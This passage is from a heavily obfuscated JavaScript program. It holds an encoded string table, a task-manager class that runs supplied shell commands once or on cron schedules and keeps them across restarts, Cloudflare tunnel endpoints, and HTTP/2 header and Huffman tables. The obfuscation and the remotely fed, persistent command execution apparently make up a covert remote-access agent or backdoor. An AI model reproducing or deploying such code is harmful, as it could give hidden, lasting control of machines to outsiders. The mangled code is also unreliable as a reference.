        're5Lr1K',
        'vuf3s3C',
        'D3jPDgvvsw50qKu',
        'y2yTAw50lq',
        'Dg9cExrLCW',
        'm3WXFdj8mhW0',
        'BwvZC2fNzq',
        'qK95Cey',
        'AhnireO',
        'BMvLza',
        'C2vYDMvYCW',
        'r2XAr2K',
        'Bwf5yMvtzxj2zq',
        'DKTtwMO',
        'ANDR',
        'y29UBMvJDgLVBNm',
        'rM16zfO',
        'r1nIzvu',
        'wvDeC1C',
        'DMfSDwvZ',
        'lMvUDG',
        'icHZzwn1CMuGzg5ZoIbUBYbYzwnVCMqP',
        'x2rYywLU',
        'C2v0qxv0AfrHzW',
        'CMvHzfvjBNqZmKjf',
        'mhWZFdj8mxW0',
        'sgDbt0u',
        'zgLYBMfTzq',
        'uw90sMC',
        'uw9OC0y',
        'ls0Tls1cruDjtG',
        'CvrQv0m',
        's3vIzxjUzxrLCW',
        'ihvWzgf0zwq',
        'tLnttNm',
        'yNvRyuu',
        'C2v0vtmY',
        'C2f2zwrFyxq',
        'x3n0yxr1C19JywnOzv90Aw1L',
        'mty4',
        'Aw1Hz2uVANbLzW',
        'Ec1VCMLNAw5HBc1WyxrO',
        'u1L6rw4',
        'x29Urgf0yunI',
        'Dgv4Dc9ODg1SoYbJAgfYC2v0pxv0zI04',
        'A2v5ugfPCG',
        'Aw52ywXPzcbXDwLJAYb0Dw5UzwWGCMvZCg9UC2u6ia',
        'ywnJzxb0lxjHBMDLCW',
        'DgfZA01LDgfmAw5LuMu',
        'ywrLBxi',
        'Be5IANC',
        'zwfgswC',
        'BMv3vg9Rzw4',
        'zwrNzsbJB25Uzwn0igzHAwXLza',
        'Ag9ZDg5HBwu',
        'vvrWANq',
        'u2fPBvu',
        'uvbPu0G',
        'v3vxvfa',
        'Ec1MAwXLlw5HBwu',
        'q09MwhK',
        'wNjKCeu',
        'B21IzeC',
        'z2v0twLUDxrLCW',
        'x2nVBNn1BwvuBhm',
        'nhWZFdv8mxWYFda',
        'zwz0Cwu',
        'zxHPC3rZu3LUyW',
        'A2v5x2LK',
        'vgvOv2K',
        'ywzSquy',
        'l2fWAs9MAwXLl3vUEMLW',
        'veHhy1m',
        'zgj1CW',
        'y3fJBMq',
        'w1rHC2TtDg9Yzv0G4P2miowTMowcQoEjIoACRca',
        'x2zPBMLZAa',
        'CNGG',
        'Bwf4swrSzvrPBwvVDxq',
        'DhvUBMvSigfSCMvHzhKGzxHPC3rZig9UihbVCNqG',
        'x2DLDenVBM5Ly3rPB25Z',
        'Afb4Dfm',
        'Dw5Oyw5KBgvKiffvsumGzNjHBwuGDhLWzsaWEa',
        'rNrPAxG',
        'vM10tuq',
        'DfDgANq',
        'sMH0BNu',
        'BgLUAW',
        'runjrvnFufvcs0vzoIdMNkRORR7NVA7NJQ/LOOpLJ5JPH4/KUjtMLOFKU7yGA2v5CY9Hz2vUDf9Ly2LLC19WDwiUyJy0ios4JEwTMowCQa',
        'l3bYB2mVy3b1Aw5MBW',
        'r2vhvge',
        'tMv4DxmTuhL0Ag9U',
        'qMfKihnPz25HDhvYzq',
        'EuPQrg0',
        'rMfPBgvKihrVihbHCNnLifvstcbMCM9T',
        'whDTt3i',
        'B2Diwg0',
        'ywXSienSB3vKzMXHCMuGzwrNzxmGzMfPBgvKoIa',
        'z2v0ywrKCMLUzM8Gru5pvezpvu5eia',
        'BeLwqK8',
        'sgD6wvi',
        'tfrPwwK',
        'BK52A1C',
        'vLvgC2G',
        'l2fWAs90yxnRl3n0yxr1CW',
        'x2HHBMrSzvjHD01LC3nHz2u',
        'ChvIBgLJx2i2na',
        'DKnQCxa',
        'z2v0t25LDgLTzuXVz3m',
        'B25szwfKEq',
        'zMLUAxnOzwq',
        'te9hx0XfvKvm',
        'BMz1r1C',
        'uhL1CLy',
        'oNbHDgG',
        'l2fWAs9IyxnLAw5MBW',
        't1bftG',
        'C1fezeW',
        'tgXkAK4',
        'l2fWAs9YDw4',
        'zwnPzxnFChvIBgLJx2i2na',
        'Aw5JB2DUAxrV',
        'AfLvD1y',
        'yLrYyKm',
        'svviwuu',
        'EuHZA2C',
        'wNb5vwm',
        'u3LZDgvTsw5MB0nVBgXLy3rVCIbPBML0AwfSAxPLza',
        'BKr3z1y',
        'z2v0tg9JywXjuhy0',
        'vxrUuw8',
        'rvLTzKW',
        'C3vqrNq',
        'DvzbuMK',
        'vK5Qwvy',
        'AxDfBNe',
        'BwfUwgy',
        'Ec1KBc1LBMm',
        'C1zOu3i',
        'C3rHDfn5BMm',
        'y29SBgvJDfn0yxrPy0LUzM8',
        'teTvqMi',
        'vxzjsfy',
        'x3jLDhvYBKXVC3q',
        'twHeu00',
        'qxryquW',
        'BxnNuMvZB2X2zxjZ',
        'vvjYuwu',
        'lMnVBNrHAw5LCMvUDG',
        'DgfZA2TPBgWGl0yGl1qGl1bjrca',
        'qvbAAMS',
        'CYbHCcb0CMfMzMLJ',
        'tufss1nFrevwx1jpt1q',
        'mxW1Fdj8m3W0Fda',
        'y29UDgvUDa',
        'A2LZyw1HlxDZlxrVA2vUlxyX',
        'tufss1nFuLvox1jpt1q',
        'y2H1BMTF',
        'z2v0tw9UDgG',
        'yxbWBgLJyxrPB24VANnVBG',
        'r0PyyLy',
        'Bwz5v2y',
        'zNDVwMe',
        'wfnvA3u',
        'AwrSzvrPBwvVDxq',
        'y29SBgvJDe5LDeLUzM8',
        'A3zT',
        'D2LssNi',
        'rMn4DMy',
        'CgLK',
        'yMn0z1e',
        'zMrKBNC',
        'C2nPza',
        'CgvLCKXPBwL0',
        'x2nVBM5Ly3rfzgDL',
        'DxnLtM9PC2u',
        'y2H1BMTFAwq',
        'zufvqw4',
        'ksWG5BEY5zUE6ycaidaGkoAzRUMaMUwqR+wkQcK7iowqIoAZLEwpLUwaVdOGmc8XlZiVmNe',
        'wuXTu0y',
        'rNzOr0G',
        'Cg93zxjZAgvSBc5LEgu',
        'yuTbz0q',
        'C3rHDgu',
        'sgfUzhnOywTLu3rHDgu',
        'lNrTCa',
        'q0Hoq3q',
        'C2P0sxm',
        'CvHbt1q',
        'w1rHC2TtDg9Yzv0G4P2mia',
        'yNvPBgrdBgLLBNrizwXSBW',
        'CM1KAxjtEw5J',
        'Efn4v28',
        'B3zLCNDYAxrL',
        'AezlD2W',
        'AvnAA2S'
    ];
    a0a = function () {
        return lN;
    };
    return a0a();
}
class a0ai {
    static [a0cm(0xda7)] = new Map();
    static [a0cm(0xb8f)](a, b) {
        const fj = a0cm, c = {
                'pJrLk': function (d, f) {
                    return d > f;
                }
            };
        a['push'](b), c[fj(0x19e)](a[fj(0x55c)], a0a1[fj(0x3d9)]) && a[fj(0x8cd)](0x0, a[fj(0x55c)] - a0a1[fj(0x3d9)]);
    }
    static [a0cm(0x4b3)](a, b, c, d, f = null) {
        const fk = a0cm, g = new Date()[fk(0x213)]();
        return {
            'ts': g,
            'cmd': a,
            'output': b,
            'exitcode': c,
            'type': d,
            'cron': f,
            'formatted': g + fk(0x3b1) + a + fk(0x26a) + c + '\x0a' + (b?.['trim']() || '')
        };
    }
    static [a0cm(0xb03)]() {
        const fl = a0cm;
        return {
            'status': 'ok',
            'count': a0a1[fl(0x31d)]['length'],
            'tasks': a0a1[fl(0x31d)]
        };
    }
    static [a0cm(0xc12)] = /^\s*(?:#|rem\b)\s*kisama-task:\s*(.*)$/i;
    static ['parseTaskMeta'](a) {
        const fm = a0cm, b = {
                'imVLK': function (d, f) {
                    return d(f);
                },
                'fzaHF': function (d, f) {
                    return d ?? f;
                }
            }, c = b[fm(0x8c2)](String, b[fm(0x7ea)](a, ''))[fm(0xb0c)]('\x0a')['slice'](0x0, 0x3);
        for (const d of c) {
            const f = a0ai['taskMetaLineRe'][fm(0x188)](d);
            if (!f)
                continue;
            const g = /\bid=(\d+)\b/[fm(0x188)](f[0x1])?.[0x1];
            if (!g)
                return null;
            const h = Number(/\bupdated=(\d+)\b/[fm(0x188)](f[0x1])?.[0x1] || 0x0);
            return {
                'id': g,
                'updated': h
            };
        }
        return null;
    }
    static [a0cm(0x6f2)](a) {
        const fn = a0cm, b = {
                'vSsVD': function (d, f) {
                    return d(f);
                },
                'wkTit': function (d, f) {
                    return d < f;
                },
                'aMzbW': function (d, f) {
                    return d + f;
                },
                'ccAGD': function (d, f) {
                    return d ?? f;
                }
            }, c = b[fn(0xd19)](String, a ?? '')[fn(0xb0c)]('\x0a');
        for (let d = 0x0; b['wkTit'](d, Math[fn(0x389)](0x3, c[fn(0x55c)])); d++) {
            if (a0ai['taskMetaLineRe']['test'](c[d]))
                return [
                    ...c[fn(0x2d5)](0x0, d),
                    ...c['slice'](b[fn(0xb1c)](d, 0x1))
                ][fn(0x455)]('\x0a');
        }
        return b['vSsVD'](String, b['ccAGD'](a, ''));
    }
    static [a0cm(0xcea)](a, b, c) {
        const fo = a0cm, d = {
                'oncNu': function (j, k) {
                    return j === k;
                }
            }, f = a0ai[fo(0x6f2)](a), g = d[fo(0xd41)](process[fo(0x267)], fo(0x269)) ? fo(0xb46) : '#', h = g + '\x20kisama-task:\x20id=' + b + fo(0x3e1) + c, i = f['split']('\x0a');
        return i['splice'](i[0x0]?.[fo(0x830)]('#!') ? 0x1 : 0x0, 0x0, h), i[fo(0x455)]('\x0a');
    }
    static [a0cm(0x2e0)](a, b) {
        const fp = a0cm, c = {
                'qmGNA': function (j, k) {
                    return j(k);
                },
                'YppPb': function (j, k) {
                    return j < k;
                },
                'zyuMF': function (j, k) {
                    return j < k;
                },
                'zhaHf': function (j, k) {
                    return j === k;
                },
                'HJDJw': function (j, k) {
                    return j(k);
                }
            }, d = Date[fp(0x866)](), f = j => (j || [])[fp(0x8a0)](k => ({
                'raw': String(k ?? ''),
                'meta': a0ai[fp(0x3ed)](k),
                'eff': a0ai[fp(0x6f2)](k)['trim']()
            })), g = c[fp(0x901)](f, b), h = new Set(), i = [];
        for (const {
                    raw: j,
                    meta: k,
                    eff: l
                } of c['qmGNA'](f, a)) {
            let m = -0x1;
            k && (m = g[fp(0x646)]((p, q) => !h[fp(0x314)](q) && p[fp(0x7ef)] && p[fp(0x7ef)]['id'] === k['id']));
            c[fp(0x448)](m, 0x0) && (m = g['findIndex']((p, q) => !h['has'](q) && p['eff'] === l && (!k || !p[fp(0x7ef)])));
            if (c[fp(0x40d)](m, 0x0)) {
                i[fp(0x1d5)](a0ai[fp(0xcea)](l, c[fp(0x901)](String, d), d));
                continue;
            }
            const n = g[m];
            h[fp(0x1d9)](m);
            if (c[fp(0xdb8)](n[fp(0x236)], l)) {
                n[fp(0x7ef)] ? i[fp(0x1d5)](a0ai[fp(0xcea)](n[fp(0xcc3)], n[fp(0x7ef)]['id'], n[fp(0x7ef)][fp(0x1e2)])) : i[fp(0x1d5)](a0ai[fp(0xcea)](n[fp(0xcc3)], k ? k['id'] : c[fp(0x3b3)](String, d), k && k['updated'] ? k['updated'] : d));
                continue;
            }
            const o = n['meta'] ? n[fp(0x7ef)]['id'] : k ? k['id'] : String(d);
            i[fp(0x1d5)](a0ai[fp(0xcea)](l, o, d));
        }
        return i;
    }
    static [a0cm(0x7e1)](a, b) {
        const fq = a0cm, c = {
                'VAEvu': function (j, k) {
                    return j < k;
                },
                'yxKcn': function (j, k) {
                    return j(k);
                },
                'zAUgU': function (j, k) {
                    return j === k;
                }
            }, d = Date[fq(0x866)](), f = ([j, k]) => ({
                'expr': String(j),
                'raw': String(k ?? ''),
                'meta': a0ai[fq(0x3ed)](k),
                'eff': a0ai['stripTaskMetaLine'](k)[fq(0x58a)]()
            }), g = Object['entries'](b || {})['map'](f), h = new Set(), i = {};
        for (const {
                    expr: j,
                    raw: k,
                    meta: l,
                    eff: m
                } of Object[fq(0x1c8)](a || {})[fq(0x8a0)](f)) {
            let n = -0x1;
            l && (n = g[fq(0x646)]((q, r) => !h['has'](r) && q['meta'] && q['meta']['id'] === l['id']));
            c[fq(0x1be)](n, 0x0) && (n = g['findIndex']((q, r) => !h[fq(0x314)](r) && q[fq(0x22e)] === j && q['eff'] === m && (!l || !q['meta'])));
            if (n < 0x0) {
                i[j] = a0ai['withTaskMeta'](m, c['yxKcn'](String, d), d);
                continue;
            }
            const o = g[n];
            h[fq(0x1d9)](n);
            if (o[fq(0x236)] === m && c[fq(0xae6)](o[fq(0x22e)], j)) {
                o[fq(0x7ef)] ? i[j] = a0ai[fq(0xcea)](o['raw'], o[fq(0x7ef)]['id'], o[fq(0x7ef)][fq(0x1e2)]) : i[j] = a0ai['withTaskMeta'](o[fq(0xcc3)], l ? l['id'] : c[fq(0x435)](String, d), l && l[fq(0x1e2)] ? l[fq(0x1e2)] : d);
                continue;
            }
            const p = o[fq(0x7ef)] ? o[fq(0x7ef)]['id'] : l ? l['id'] : c[fq(0x435)](String, d);
            i[j] = a0ai[fq(0xcea)](m, p, d);
        }
        return i;
    }
    static async ['setOnetimeTasks'](a) {
        const fr = a0cm, b = {
                'WgxqY': function (d, f) {
                    return d > f;
                },
                'dfVNv': function (d, f) {
                    return d < f;
                },
                'hfxLC': fr(0x560),
                'GZXiL': function (d, f) {
                    return d === f;
                },
                'AKmfI': fr(0xaa0)
            };
        a0a1[fr(0x31d)] = a && b[fr(0x19b)](a[fr(0x55c)], 0x0) ? a0ai['normalizeOnetimeTasks'](a, a0a1[fr(0x31d)]) : [];
        const c = [];
        if (a0a1[fr(0x910)] && a0a1['onetasks'][fr(0x55c)] > 0x0) {
            for (let d = 0x0; b['dfVNv'](d, a0a1['onetasks'][fr(0x55c)]); d++) {
                const f = a0a1[fr(0x31d)][d], g = await a0ad[fr(0x4b6)](f), h = this[fr(0x4b3)](f, g[fr(0xa18)], g[fr(0xcb0)], b[fr(0x493)]);
                this['_appendLog'](a0a1['onetimetasks_log'], h), c[fr(0x1d5)]({
                    'index': d,
                    'cmd': f,
                    'exitcode': g[fr(0xcb0)],
                    'output': g[fr(0xa18)],
                    'status': b[fr(0x848)](g[fr(0xcb0)], 0x0) ? 'ok' : b[fr(0x75a)]
                });
            }
            a0a1[fr(0x910)] = ![];
        }
        return {
            'status': 'ok',
            'count': a0a1[fr(0x31d)][fr(0x55c)],
            'tasks': a0a1[fr(0x31d)],
            'executed': c,
            'persisted': a0ah[fr(0x174)](a0a1[fr(0x31d)], a0a1[fr(0x5ec)])
        };
    }
    static ['getCronTasks']() {
        const ft = a0cm;
        return {
            'status': 'ok',
            'count': Object[ft(0x40f)](a0a1[ft(0x5ec)])[ft(0x55c)],
            'tasks': a0a1[ft(0x5ec)]
        };
    }
    static [a0cm(0x2fc)](a) {
        const fu = a0cm, b = {
                'kEnEw': function (d, f) {
                    return d === f;
                },
                'zydTt': fu(0x13e),
                'YBmFf': fu(0x392),
                'XEBmg': function (d, f) {
                    return d > f;
                },
                'TUpbt': 'error',
                'SajHG': function (d, f) {
                    return d - f;
                }
            };
        this[fu(0xda7)][fu(0x850)](d => {
            const fv = fu;
            b[fv(0xce2)](typeof d['stop'], 'function') && d['stop'](), b['kEnEw'](typeof d[fv(0xaeb)], b[fv(0x315)]) && d[fv(0xaeb)]();
        }), this[fu(0xda7)][fu(0x230)]();
        const c = [];
        for (const d of Object['keys'](a || {})) {
            !a0t[fu(0x4da)](d) && c[fu(0x1d5)](d);
        }
        if (b[fu(0xa28)](c[fu(0x55c)], 0x0))
            return {
                'status': b[fu(0x475)],
                'message': fu(0x3ce) + c[fu(0x455)](',\x20'),
                'valid_count': b[fu(0xb54)](Object['keys'](a || {})['length'], c['length'])
            };
        a0a1[fu(0x5ec)] = a && b[fu(0xa28)](Object[fu(0x40f)](a)[fu(0x55c)], 0x0) ? a0ai[fu(0x7e1)](a, a0a1[fu(0x5ec)]) : {};
        for (const [f, g] of Object[fu(0x1c8)](a0a1[fu(0x5ec)])) {
            const h = a0t[fu(0x161)](f, async () => {
                const fw = fu, i = await a0ad[fw(0x4b6)](g), j = this[fw(0x4b3)](g, i[fw(0xa18)], i[fw(0xcb0)], b['YBmFf'], f);
                this[fw(0xb8f)](a0a1[fw(0x3f7)], j);
            });
            this[fu(0xda7)]['set'](f, h);
        }
        return a0a1['cronloop'] = Object[fu(0x40f)](a0a1[fu(0x5ec)])[fu(0x55c)] > 0x0, {
            'status': 'ok',
            'count': Object['keys'](a0a1['crontasks'])[fu(0x55c)],
            'tasks': a0a1['crontasks'],
            'persisted': a0ah[fu(0x174)](a0a1['onetasks'], a0a1[fu(0x5ec)])
        };
    }
    static [a0cm(0x1cd)]() {
        const fx = a0cm;
        return {
            'onetime': {
                'pending': a0a1['InitTask'],
                'count': a0a1[fx(0x31d)][fx(0x55c)]
            },
            'cron': {
                'active': a0a1[fx(0x963)],
                'count': Object['keys'](a0a1[fx(0x5ec)])[fx(0x55c)],
                'check_interval': a0a1['CRON_CHECK_INTERVAL']
            },
            'persistence': {
                'enabled': a0ah[fx(0xc99)][fx(0xa9c)],
                'store_path': a0ah[fx(0xc99)][fx(0xa3d)],
                'last_saved_at': a0ah['state'][fx(0x42e)]
            }
        };
    }
    static [a0cm(0xc4e)](a = 0x32) {
        const fy = a0cm, b = a0a1[fy(0x184)][fy(0x2d5)](-a);
        return {
            'status': 'ok',
            'count': b['length'],
            'logs': b
        };
    }
    static ['getCronLogs'](a = 0x32) {
        const fz = a0cm, b = a0a1['crontasks_log'][fz(0x2d5)](-a);
        return {
            'status': 'ok',
            'count': b['length'],
            'logs': b
        };
    }
    static [a0cm(0xb04)]() {
        const fA = a0cm, a = { 'ZrdpE': fA(0x560) }, b = a0a1[fA(0x184)][fA(0x55c)];
        return a0a1[fA(0x184)] = [], {
            'status': 'ok',
            'cleared': a[fA(0xc1f)]
        };
    }
    static [a0cm(0x43c)]() {
        const fB = a0cm, a = { 'VuFXk': fB(0x392) }, b = a0a1['crontasks_log'][fB(0x55c)];
        return a0a1[fB(0x3f7)] = [], {
            'status': 'ok',
            'cleared': a[fB(0x982)]
        };
    }
    static [a0cm(0x98d)]() {
        const fC = a0cm, a = {
                'aLJPB': function (g, h) {
                    return g - h;
                }
            }, b = a0a1[fC(0x184)][fC(0x88f)](g => g['exitcode'] === 0x0)[fC(0x55c)], c = a0a1[fC(0x184)][fC(0x55c)] - b, d = a0a1[fC(0x3f7)][fC(0x88f)](g => g[fC(0xcb0)] === 0x0)[fC(0x55c)], f = a[fC(0xd91)](a0a1[fC(0x3f7)][fC(0x55c)], d);
        return {
            'onetime': {
                'total_logged': a0a1[fC(0x184)]['length'],
                'max_capacity': a0a1[fC(0x3d9)],
                'recent_success': b,
                'recent_failed': c
            },
            'cron': {
                'total_logged': a0a1[fC(0x3f7)]['length'],
                'max_capacity': a0a1[fC(0x3d9)],
                'recent_success': d,
                'recent_failed': f
            }
        };
    }
    static async ['executeOnetimeTasks']() {
        const fD = a0cm, a = {
                'TXfpD': function (c, d) {
                    return c < d;
                },
                'nNMDb': fD(0x560)
            }, b = [];
        for (let c = 0x0; a[fD(0x3e9)](c, a0a1[fD(0x31d)][fD(0x55c)]); c++) {
            const d = a0a1[fD(0x31d)][c], f = await a0ad[fD(0x4b6)](d), g = this[fD(0x4b3)](d, f[fD(0xa18)], f[fD(0xcb0)], a[fD(0x83c)]);
            this[fD(0xb8f)](a0a1[fD(0x184)], g), b[fD(0x1d5)]({
                'cmd': d,
                'exitcode': f['exitcode'],
                'output': f[fD(0xa18)],
                'timeout': f[fD(0x563)]
            });
        }
        return a0a1[fD(0x910)] = ![], {
            'status': 'ok',
            'executed': b['length'],
            'results': b
        };
    }
    static [a0cm(0xcf8)]() {
        const fE = a0cm, a = {
                'XcNrt': function (c, d) {
                    return c > d;
                },
                'oFIbu': function (c, d) {
                    return c > d;
                }
            };
        a0ah[fE(0x776)]();
        const b = a0ah[fE(0x612)]();
        a['XcNrt'](b['onetasks']['length'], 0x0) && (a0a1['onetasks'] = b[fE(0x31d)]);
        if (a[fE(0x4cb)](Object[fE(0x40f)](b[fE(0x5ec)])['length'], 0x0))
            try {
                a0ai['setCronTasks'](b['crontasks']);
            } catch (c) {
                a0P['error'](fE(0x452) + c[fE(0xbe8)]);
            }
        a[fE(0x4cb)](a0a1[fE(0x31d)][fE(0x55c)], 0x0) && a0a1[fE(0x910)] && a0ai[fE(0xd3a)]()[fE(0xd7b)](d => a0P['error'](fE(0x703) + d['message']));
    }
}
const a0aj = 'https://api.trycloudflare.com', a0ak = ((() => {
        const fF = a0cm, a = {
                'wQwxc': function (c, d) {
                    return c(d);
                },
                'xotri': function (c, d) {
                    return c > d;
                },
                'nLCsG': fF(0x16c)
            }, b = a[fF(0x4b7)](String, process.env.KISAMA_EDGE_HOSTS || '')['split'](',')['map'](c => c[fF(0x58a)]())[fF(0x88f)](Boolean);
        return a[fF(0x29e)](b['length'], 0x0) ? b : [
            'region1.v2.argotunnel.com',
            a[fF(0xa8d)]
        ];
    })()), a0al = 0x1ea4, a0am = a0cm(0xb64), a0an = a0cm(0xd56), a0ao = 0x4000, a0ap = [
        [
            a0cm(0x350),
            ''
        ],
        [
            a0cm(0x282),
            a0cm(0x226)
        ],
        [
            a0cm(0x282),
            a0cm(0xd69)
        ],
        [
            a0cm(0xc54),
            '/'
        ],
        [
            a0cm(0xc54),
            a0cm(0xbaa)
        ],
        [
            a0cm(0x4e9),
            a0cm(0x6c5)
        ],
        [
            a0cm(0x4e9),
            a0cm(0x959)
        ],
        [
            ':status',
            '200'
        ],
        [
            ':status',
            a0cm(0xade)
        ],
        [
            a0cm(0x7a3),
            a0cm(0x2a2)
        ],
        [
            a0cm(0x7a3),
            a0cm(0x86b)
        ],
        [
            ':status',
            a0cm(0xda0)
        ],
        [
            a0cm(0x7a3),
            a0cm(0x8f4)
        ],
        [
            ':status',
            a0cm(0xd75)
        ],
        [
            'accept-charset',
            ''
        ],
        [
            'accept-encoding',
            a0cm(0x57c)
        ],
        [
            a0cm(0x190),
            ''
        ],
        [
            a0cm(0xc11),
            ''
        ],
        [
            a0cm(0x1e9),
            ''
        ],
        [
            a0cm(0x249),
            ''
        ],
        [
            a0cm(0x2a0),
            ''
        ],
        [
            a0cm(0x215),
            ''
        ],
        [
            a0cm(0x39e),
            ''
        ],
        [
            a0cm(0xadf),
            ''
        ],
        [
            'content-disposition',
            ''
        ],
        [
            a0cm(0xd98),
            ''
        ],
        [
            a0cm(0xd62),
            ''
        ],
        [
            a0cm(0x5be),
            ''
        ],
        [
            a0cm(0x5c3),
            ''
        ],
        [
            a0cm(0xafb),
            ''
        ],
        [
            a0cm(0x9bd),
            ''
        ],
        [
            a0cm(0x155),
            ''
        ],
        [
            a0cm(0x300),
            ''
        ],
        [
            'etag',
            ''
        ],
        [
            a0cm(0x9d7),
            ''
        ],
        [
            a0cm(0x5a7),
            ''
        ],
        [
            a0cm(0x1e7),
            ''
        ],
        [
            a0cm(0x78f),
            ''
        ],
        [
            'if-match',
            ''
        ],
        [
            a0cm(0x908),
            ''
        ],
        [
            a0cm(0xd61),
            ''
        ],
        [
            a0cm(0xb56),
            ''
        ],
        [
            a0cm(0xa86),
            ''
        ],
        [
            a0cm(0x551),
            ''
        ],
        [
            a0cm(0xc39),
            ''
        ],
        [
            a0cm(0x988),
            ''
        ],
        [
            a0cm(0x6b4),
            ''
        ],
        [
            a0cm(0xb7d),
            ''
        ],
        [
            a0cm(0x789),
            ''
        ],
        [
            a0cm(0x28f),
            ''
        ],
        [
            a0cm(0x23e),
            ''
        ],
        [
            'refresh',
            ''
        ],
        [
            a0cm(0x310),
            ''
        ],
        [
            a0cm(0x18c),
            ''
        ],
        [
            'set-cookie',
            ''
        ],
        [
            a0cm(0x8ae),
            ''
        ],
        [
            'transfer-encoding',
            ''
        ],
        [
            'user-agent',
            ''
        ],
        [
            a0cm(0x443),
            ''
        ],
        [
            'via',
            ''
        ],
        [
            'www-authenticate',
            ''
        ]
    ], a0aq = [
        0x1ff8,
        0x7fffd8,
        0xfffffe2,
        0xfffffe3,
        0xfffffe4,
        0xfffffe5,
        0xfffffe6,
        0xfffffe7,
        0xfffffe8,
        0xffffea,
        0x3ffffffc,
        0xfffffe9,
        0xfffffea,
        0x3ffffffd,
        0xfffffeb,
        0xfffffec,
        0xfffffed,
        0xfffffee,
        0xfffffef,
        0xffffff0,
        0xffffff1,
        0xffffff2,
        0x3ffffffe,
        0xffffff3,
        0xffffff4,
        0xffffff5,
        0xffffff6,
        0xffffff7,
        0xffffff8,
        0xffffff9,
        0xffffffa,
        0xffffffb,
        0x14,
        0x3f8,
        0x3f9,
        0xffa,
        0x1ff9,
        0x15,
        0xf8,
        0x7fa,
        0x3fa,
        0x3fb,
        0xf9,
        0x7fb,
        0xfa,
        0x16,
        0x17,
        0x18,
        0x0,
        0x1,
        0x2,
        0x19,
        0x1a,
        0x1b,
        0x1c,
        0x1d,
        0x1e,
        0x1f,
        0x5c,
        0xfb,
        0x7ffc,
        0x20,
        0xffb,
        0x3fc,
        0x1ffa,
        0x21,
        0x5d,
        0x5e,
        0x5f,
        0x60,
        0x61,
        0x62,
        0x63,
        0x64,
        0x65,
        0x66,
        0x67,
        0x68,
        0x69,
        0x6a,
        0x6b,
        0x6c,
        0x6d,
        0x6e,
        0x6f,
        0x70,
        0x71,
        0x72,
        0xfc,
        0x73,
        0xfd,
        0x1ffb,
        0x7fff0,
        0x1ffc,
        0x3ffc,
        0x22,
        0x7ffd,
        0x3,
        0x23,
        0x4,
        0x24,
        0x5,
        0x25,
        0x26,
        0x27,
        0x6,
        0x74,
        0x75,
        0x28,
        0x29,
        0x2a,
        0x7,
        0x2b,
        0x76,
        0x2c,
        0x8,
        0x9,
        0x2d,
        0x77,
        0x78,
        0x79,
        0x7a,
        0x7b,
        0x7ffe,
        0x7fc,
        0x3ffd,
        0x1ffd,
        0xffffffc,
        0xfffe6,
        0x3fffd2,
        0xfffe7,
        0xfffe8,
        0x3fffd3,
        0x3fffd4,
        0x3fffd5,
        0x7fffd9,
        0x3fffd6,
        0x7fffda,
        0x7fffdb,
        0x7fffdc,
        0x7fffdd,
        0x7fffde,
        0xffffeb,
        0x7fffdf,
        0xffffec,
        0xffffed,
        0x3fffd7,
        0x7fffe0,
        0xffffee,
        0x7fffe1,
        0x7fffe2,
        0x7fffe3,
        0x7fffe4,
        0x1fffdc,
        0x3fffd8,
        0x7fffe5,
        0x3fffd9,
        0x7fffe6,
        0x7fffe7,
        0xffffef,
        0x3fffda,
        0x1fffdd,
        0xfffe9,
        0x3fffdb,
        0x3fffdc,
        0x7fffe8,
        0x7fffe9,
        0x1fffde,
        0x7fffea,
        0x3fffdd,
        0x3fffde,
        0xfffff0,
        0x1fffdf,
        0x3fffdf,
        0x7fffeb,
        0x7fffec,
        0x1fffe0,
        0x1fffe1,
        0x3fffe0,
        0x1fffe2,
        0x7fffed,
        0x3fffe1,
        0x7fffee,
        0x7fffef,
        0xfffea,
        0x3fffe2,
        0x3fffe3,
        0x3fffe4,
        0x7ffff0,
        0x3fffe5,
        0x3fffe6,
        0x7ffff1,
        0x3ffffe0,
        0x3ffffe1,
        0xfffeb,
        0x7fff1,
        0x3fffe7,
        0x7ffff2,
        0x3fffe8,
        0x1ffffec,
        0x3ffffe2,
        0x3ffffe3,
        0x3ffffe4,
        0x7ffffde,
        0x7ffffdf,
        0x3ffffe5,
        0xfffff1,
        0x1ffffed,
        0x7fff2,
        0x1fffe3,
        0x3ffffe6,
        0x7ffffe0,
        0x7ffffe1,
        0x3ffffe7,
        0x7ffffe2,
        0xfffff2,
        0x1fffe4,
        0x1fffe5,
        0x3ffffe8,
        0x3ffffe9,
        0xffffffd,
        0x7ffffe3,
        0x7ffffe4,
        0x7ffffe5,
        0xfffec,
        0xfffff3,
        0xfffed,
        0x1fffe6,
        0x3fffe9,
        0x1fffe7,
        0x1fffe8,
        0x7ffff3,
        0x3fffea,
        0x3fffeb,
        0x1ffffee,
        0x1ffffef,
        0xfffff4,
        0xfffff5,
        0x3ffffea,
        0x7ffff4,
        0x3ffffeb,
        0x7ffffe6,
        0x3ffffec,
        0x3ffffed,
        0x7ffffe7,
        0x7ffffe8,
        0x7ffffe9,
        0x7ffffea,
        0x7ffffeb,
        0xffffffe,
        0x7ffffec,
        0x7ffffed,
        0x7ffffee,
        0x7ffffef,
        0x7fffff0,
        0x3ffffee,
        0x3fffffff
    ], a0ar = [
        0xd,
        0x17,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x18,
        0x1e,
        0x1c,
        0x1c,
        0x1e,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1e,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x6,
        0xa,
        0xa,
        0xc,
        0xd,
        0x6,
        0x8,
        0xb,
        0xa,
        0xa,
        0x8,
        0xb,
        0x8,
        0x6,
        0x6,
        0x6,
        0x5,
        0x5,
        0x5,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x7,
        0x8,
        0xf,
        0x6,
        0xc,
        0xa,
        0xd,
        0x6,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x8,
        0x7,
        0x8,
        0xd,
        0x13,
        0xd,
        0xe,
        0x6,
        0xf,
        0x5,
        0x6,
        0x5,
        0x6,
        0x5,
        0x6,
        0x6,
        0x6,
        0x5,
        0x7,
        0x7,
        0x6,
        0x6,
        0x6,
        0x5,
        0x6,
        0x7,
        0x6,
        0x5,
        0x5,
        0x6,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0xf,
        0xb,
